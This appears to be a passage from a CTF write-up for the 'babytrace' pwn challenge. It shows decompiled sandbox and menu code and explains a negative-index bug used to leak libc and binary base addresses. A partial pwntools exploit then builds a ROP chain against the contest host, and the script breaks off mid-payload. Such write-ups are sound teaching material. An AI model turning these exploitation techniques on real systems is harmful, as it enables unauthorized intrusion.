  <span class="n">__int64</span> <span class="n">gs_base</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">ds</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">es</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">fs</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">gs</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">user_regs_struct</span> <span class="n">v7</span><span class="p">;</span>
<span class="p">......</span>
<span class="k">do</span>
  <span class="p">{</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="n">error</span><span class="p">(</span><span class="s">"waitpid error2"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">stat_loc</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">stat_loc</span> <span class="o">==</span> <span class="mh">0x7F</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">stat_loc</span> <span class="o">&amp;</span> <span class="mh">0xFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">11</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="n">error</span><span class="p">(</span><span class="s">"GETREGS error"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">!=</span> <span class="mi">231</span> <span class="o">&amp;&amp;</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">!=</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">!=</span> <span class="mi">60</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"bad syscall: %llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">);</span>
        <span class="n">v7</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFFFLL</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
          <span class="n">error</span><span class="p">(</span><span class="s">"SETREGS error"</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="n">error</span><span class="p">(</span><span class="s">"waitpid error3"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="n">stat_loc</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">stat_loc</span> <span class="o">!=</span> <span class="mi">127</span> <span class="o">||</span> <span class="p">(</span><span class="n">stat_loc</span> <span class="o">&amp;</span> <span class="mh">0xFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">!=</span> <span class="mi">11</span><span class="p">)</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>只允许一下系统调用号，否则替换成 <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFFLL</code>​</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c">#define __NR_read 0</span>
<span class="c">#define __NR_write 1</span>
<span class="c">#define __NR_fstat 5  # 32位情况下是 open</span>
<span class="c">#define __NR_exit_group 231</span>


<span class="c"># /usr/include/x86_64-linux-gnu/asm/unistd_64.h</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>分析子进程</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre></td><td class="rouge-code"><pre>
<span class="kt">size_t</span> <span class="nf">get_int</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="kt">size_t</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">strtoll</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">menu</span><span class="p">(){</span>
  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">"choose one &gt;"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">show</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">nums</span><span class="p">){</span>
  <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">show_count</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"permission denied!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"which one?"</span><span class="p">);</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"num[%lld] = %lld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">nums</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
    <span class="o">++</span><span class="n">show_count</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">nums</span><span class="p">){</span>
  <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-220h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">520</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-210h] BYREF</span>
  <span class="kt">size_t</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+228h] [rbp-8h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">edit_count</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"recv:"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"which one?"</span><span class="p">);</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"set value?"</span><span class="p">);</span>
    <span class="n">nums</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Set up for success!"</span><span class="p">);</span>
    <span class="n">edit_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"permission denied!"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">is_main</span><span class="p">(){</span>
  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">size_t</span> <span class="n">nums</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="kt">size_t</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">nums</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nums</span><span class="p">));</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">menu</span><span class="p">();</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">show</span><span class="p">(</span><span class="n">nums</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="n">edit</span><span class="p">(</span><span class="n">nums</span><span class="p">);</span>
    <span class="k">else</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"invild."</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>无论时 show 还是 edit 功能都限制不能大于2， 但是负数也可以用</p>

<h3 id="漏洞利用"><span class="me-2">漏洞利用</span><a href="#漏洞利用" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>通过2  show 功能 可以泄露 libc 和 程序基地址，</p>

<p>然后用 edit 负向修改 edit 的返回地址为以下，就可以得到一个缓冲区溢出漏洞，后面就是ROP了</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118223943-wibd8up.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118223943-wibd8up.png" alt="image" loading="lazy"></a>​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">119.45.238.17:9999</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./babytrace</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./fix/babytrace</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="c1">#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x0D68
brva 0x000D3C
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#io = rmote()
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">set value?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.4</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="c1">#pause()
</span><span class="nf">show</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">num[-2] = </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">())</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stderr_</span><span class="sh">'</span><span class="p">]</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">show</span><span class="p">(</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">num[-3] = </span><span class="sh">'</span><span class="p">)</span>                                                                                                                                                                                                                                                                                                                                                       <span class="n">elf_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">())</span> <span class="o">-</span> <span class="mi">3656</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>


<span class="n">buf</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>                                                                                                                                                                                                                                                                                                                                                               <span class="mh">0x1F8</span><span class="p">:</span><span class="mh">0x123456</span>
<span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">3</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x00C75</span> <span class="c1"># read
</span>
<span class="nf">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">libc_rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">rax</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rbx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rbx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rcx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rcx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>                                                                                                                                                                                                                                                                                                                       <span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>


<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x1d8</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span> <span class="c1"># 上面的ROP 不是很够用，所用再构造一个大的
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x1f0</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xbeefbeef</span><span class="p">)</span>
